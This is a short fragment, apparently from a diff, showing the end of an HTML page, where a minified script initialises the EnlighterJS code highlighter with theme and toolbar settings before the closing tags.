+!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":false,"theme":"monokai","language":"python","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
+/* ]]> */
+</script>
+
+</body>
+</html>
